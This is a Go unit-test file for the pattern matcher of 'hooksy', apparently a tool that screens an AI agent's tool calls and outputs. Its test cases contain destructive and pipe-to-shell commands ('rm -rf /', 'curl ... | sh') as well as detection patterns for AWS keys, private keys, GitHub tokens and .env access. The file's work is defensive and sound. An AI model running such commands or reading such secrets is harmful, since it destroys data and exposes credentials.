package engine

import (
	"testing"

	"github.com/ihavespoons/hooksy/internal/config"
)

func TestNewMatcher(t *testing.T) {
	m := NewMatcher()
	if m == nil {
		t.Fatal("NewMatcher returned nil")
	}
}

func TestMatchToolName(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		name      string
		pattern   string
		toolName  string
		wantMatch bool
		wantErr   bool
	}{
		{
			name:      "empty pattern matches everything",
			pattern:   "",
			toolName:  "Bash",
			wantMatch: true,
		},
		{
			name:      "exact match",
			pattern:   "^Bash$",
			toolName:  "Bash",
			wantMatch: true,
		},
		{
			name:      "no match",
			pattern:   "^Bash$",
			toolName:  "Read",
			wantMatch: false,
		},
		{
			name:      "partial match with regex",
			pattern:   "Bash",
			toolName:  "mcp__acp__Bash",
			wantMatch: true,
		},
		{
			name:      "MCP tool pattern",
			pattern:   "^(Bash|mcp__.*__Bash)$",
			toolName:  "mcp__acp__Bash",
			wantMatch: true,
		},
		{
			name:      "MCP tool pattern matches direct",
			pattern:   "^(Bash|mcp__.*__Bash)$",
			toolName:  "Bash",
			wantMatch: true,
		},
		{
			name:      "MCP tool pattern no match",
			pattern:   "^(Bash|mcp__.*__Bash)$",
			toolName:  "Read",
			wantMatch: false,
		},
		{
			name:      "file tools pattern",
			pattern:   "^(Read|Write|Edit|mcp__.*__(Read|Write|Edit))$",
			toolName:  "Read",
			wantMatch: true,
		},
		{
			name:      "file tools pattern MCP",
			pattern:   "^(Read|Write|Edit|mcp__.*__(Read|Write|Edit))$",
			toolName:  "mcp__acp__Write",
			wantMatch: true,
		},
		{
			name:    "invalid regex",
			pattern: "[invalid",
			toolName: "Bash",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched, err := m.MatchToolName(tt.pattern, tt.toolName)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if matched != tt.wantMatch {
				t.Errorf("got matched=%v, want %v", matched, tt.wantMatch)
			}
		})
	}
}

func TestMatchPatterns(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		name        string
		patterns    []config.PatternMatch
		value       string
		wantMatch   bool
		wantMessage string
		wantErr     bool
	}{
		{
			name:      "empty patterns",
			patterns:  []config.PatternMatch{},
			value:     "anything",
			wantMatch: false,
		},
		{
			name: "single pattern match",
			patterns: []config.PatternMatch{
				{Pattern: `rm\s+-rf\s+/`, Message: "Dangerous rm command"},
			},
			value:       "rm -rf /",
			wantMatch:   true,
			wantMessage: "Dangerous rm command",
		},
		{
			name: "single pattern no match",
			patterns: []config.PatternMatch{
				{Pattern: `rm\s+-rf\s+/`, Message: "Dangerous rm command"},
			},
			value:     "ls -la",
			wantMatch: false,
		},
		{
			name: "multiple patterns first matches",
			patterns: []config.PatternMatch{
				{Pattern: `rm\s+-rf`, Message: "rm -rf detected"},
				{Pattern: `curl.*\|.*sh`, Message: "curl pipe to shell"},
			},
			value:       "rm -rf /tmp",
			wantMatch:   true,
			wantMessage: "rm -rf detected",
		},
		{
			name: "multiple patterns second matches",
			patterns: []config.PatternMatch{
				{Pattern: `rm\s+-rf\s+/`, Message: "rm from root"},
				{Pattern: `curl.*\|.*sh`, Message: "curl pipe to shell"},
			},
			value:       "curl http://example.com | sh",
			wantMatch:   true,
			wantMessage: "curl pipe to shell",
		},
		{
			name: "AWS key detection",
			patterns: []config.PatternMatch{
				{Pattern: `AKIA[0-9A-Z]{16}`, Message: "AWS access key detected"},
			},
			value:       "Found key: AKIAIOSFODNN7EXAMPLE",
			wantMatch:   true,
			wantMessage: "AWS access key detected",
		},
		{
			name: "private key detection",
			patterns: []config.PatternMatch{
				{Pattern: `-----BEGIN.*PRIVATE KEY-----`, Message: "Private key detected"},
			},
			value:       "-----BEGIN RSA PRIVATE KEY-----",
			wantMatch:   true,
			wantMessage: "Private key detected",
		},
		{
			name: "GitHub token detection",
			patterns: []config.PatternMatch{
				{Pattern: `ghp_[a-zA-Z0-9]{36}`, Message: "GitHub token detected"},
			},
			value:       "token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
			wantMatch:   true,
			wantMessage: "GitHub token detected",
		},
		{
			name: "invalid pattern",
			patterns: []config.PatternMatch{
				{Pattern: "[invalid", Message: "bad pattern"},
			},
			value:   "test",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := m.MatchPatterns(tt.patterns, tt.value)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if result.Matched != tt.wantMatch {
				t.Errorf("got Matched=%v, want %v", result.Matched, tt.wantMatch)
			}
			if tt.wantMatch && result.Message != tt.wantMessage {
				t.Errorf("got Message=%q, want %q", result.Message, tt.wantMessage)
			}
		})
	}
}

func TestMatchToolInput(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		name        string
		patterns    map[string][]config.PatternMatch
		toolInput   map[string]interface{}
		wantMatch   bool
		wantMessage string
		wantErr     bool
	}{
		{
			name:      "empty patterns",
			patterns:  map[string][]config.PatternMatch{},
			toolInput: map[string]interface{}{"command": "ls"},
			wantMatch: false,
		},
		{
			name: "command field matches",
			patterns: map[string][]config.PatternMatch{
				"command": {
					{Pattern: `rm\s+-rf`, Message: "rm -rf detected"},
				},
			},
			toolInput:   map[string]interface{}{"command": "rm -rf /tmp"},
			wantMatch:   true,
			wantMessage: "rm -rf detected",
		},
		{
			name: "command field no match",
			patterns: map[string][]config.PatternMatch{
				"command": {
					{Pattern: `rm\s+-rf`, Message: "rm -rf detected"},
				},
			},
			toolInput: map[string]interface{}{"command": "ls -la"},
			wantMatch: false,
		},
		{
			name: "file_path field matches",
			patterns: map[string][]config.PatternMatch{
				"file_path": {
					{Pattern: `\.env$`, Message: "env file access"},
				},
			},
			toolInput:   map[string]interface{}{"file_path": "/app/.env"},
			wantMatch:   true,
			wantMessage: "env file access",
		},
		{
			name: "field not in input",
			patterns: map[string][]config.PatternMatch{
				"command": {
					{Pattern: `rm`, Message: "rm detected"},
				},
			},
			toolInput: map[string]interface{}{"file_path": "/tmp/test"},
			wantMatch: false,
		},
		{
			name: "multiple fields first matches",
			patterns: map[string][]config.PatternMatch{
				"command": {
					{Pattern: `rm`, Message: "rm detected"},
				},
				"file_path": {
					{Pattern: `\.env$`, Message: "env file"},
				},
			},
			toolInput:   map[string]interface{}{"command": "rm file.txt", "file_path": "/app/test"},
			wantMatch:   true,
			wantMessage: "rm detected",
		},
		{
			name: "numeric value converted to string",
			patterns: map[string][]config.PatternMatch{
				"timeout": {
					{Pattern: `^0$`, Message: "zero timeout"},
				},
			},
			toolInput:   map[string]interface{}{"timeout": 0},
			wantMatch:   true,
			wantMessage: "zero timeout",
		},
		{
			name: "invalid pattern in field",
			patterns: map[string][]config.PatternMatch{
				"command": {
					{Pattern: "[invalid", Message: "bad"},
				},
			},
			toolInput: map[string]interface{}{"command": "test"},
			wantErr:   true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := m.MatchToolInput(tt.patterns, tt.toolInput)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if result.Matched != tt.wantMatch {
				t.Errorf("got Matched=%v, want %v", result.Matched, tt.wantMatch)
			}
			if tt.wantMatch && result.Message != tt.wantMessage {
				t.Errorf("got Message=%q, want %q", result.Message, tt.wantMessage)
			}
		})
	}
}

func TestMatchToolResponse(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		name         string
		patterns     []config.PatternMatch
		toolResponse map[string]interface{}
		wantMatch    bool
		wantMessage  string
		wantErr      bool
	}{
		{
			name:         "nil response",
			patterns:     []config.PatternMatch{{Pattern: `test`, Message: "test"}},
			toolResponse: nil,
			wantMatch:    false,
		},
		{
			name: "AWS key in output",
			patterns: []config.PatternMatch{
				{Pattern: `AKIA[0-9A-Z]{16}`, Message: "AWS key found"},
			},
			toolResponse: map[string]interface{}{
				"output": "Config: AKIAIOSFODNN7EXAMPLE",
			},
			wantMatch:   true,
			wantMessage: "AWS key found",
		},
		{
			name: "private key in stderr",
			patterns: []config.PatternMatch{
				{Pattern: `-----BEGIN.*PRIVATE KEY-----`, Message: "Private key leaked"},
			},
			toolResponse: map[string]interface{}{
				"stderr": "-----BEGIN RSA PRIVATE KEY-----",
			},
			wantMatch:   true,
			wantMessage: "Private key leaked",
		},
		{
			name: "no match in response",
			patterns: []config.PatternMatch{
				{Pattern: `AKIA[0-9A-Z]{16}`, Message: "AWS key"},
			},
			toolResponse: map[string]interface{}{
				"output": "Operation completed successfully",
			},
			wantMatch: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := m.MatchToolResponse(tt.patterns, tt.toolResponse)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if result.Matched != tt.wantMatch {
				t.Errorf("got Matched=%v, want %v", result.Matched, tt.wantMatch)
			}
			if tt.wantMatch && result.Message != tt.wantMessage {
				t.Errorf("got Message=%q, want %q", result.Message, tt.wantMessage)
			}
		})
	}
}

func TestMatcherCaching(t *testing.T) {
	m := NewMatcher()

	// First call compiles and caches
	matched1, err := m.MatchToolName(`^Bash$`, "Bash")
	if err != nil {
		t.Fatalf("first call failed: %v", err)
	}
	if !matched1 {
		t.Error("first call should match")
	}

	// Second call uses cache
	matched2, err := m.MatchToolName(`^Bash$`, "Bash")
	if err != nil {
		t.Fatalf("second call failed: %v", err)
	}
	if !matched2 {
		t.Error("second call should match")
	}

	// Different pattern
	matched3, err := m.MatchToolName(`^Read$`, "Bash")
	if err != nil {
		t.Fatalf("third call failed: %v", err)
	}
	if matched3 {
		t.Error("third call should not match")
	}
}

func TestFlattenToString(t *testing.T) {
	tests := []struct {
		name  string
		input map[string]interface{}
		want  string
	}{
		{
			name:  "nil map",
			input: nil,
			want:  "",
		},
		{
			name:  "empty map",
			input: map[string]interface{}{},
			want:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := flattenToString(tt.input)
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}

	// Test non-empty map separately since order is not guaranteed
	t.Run("non-empty map contains keys", func(t *testing.T) {
		input := map[string]interface{}{
			"output": "hello",
			"code":   0,
		}
		got := flattenToString(input)
		if got == "" {
			t.Error("expected non-empty result")
		}
		// Check that key-value pairs are present (order may vary)
		if !contains(got, "output: hello") {
			t.Errorf("expected output in result, got %q", got)
		}
		if !contains(got, "code: 0") {
			t.Errorf("expected code in result, got %q", got)
		}
	})
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
}

func containsHelper(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
